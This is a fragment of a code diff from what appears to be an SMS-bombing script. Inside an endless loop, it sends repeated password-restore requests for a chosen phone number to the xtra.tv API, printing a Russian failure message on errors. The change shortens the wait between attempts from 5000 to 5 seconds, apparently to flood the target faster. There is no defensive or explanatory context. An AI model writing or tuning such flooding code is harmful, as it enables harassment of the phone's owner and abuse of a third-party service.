@@ -61,4 +61,4 @@ while True:
      response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
  except:
      print('Не доставлено "xtra.tv-pass"')
-     time.sleep(5000)
+     time.sleep(5)
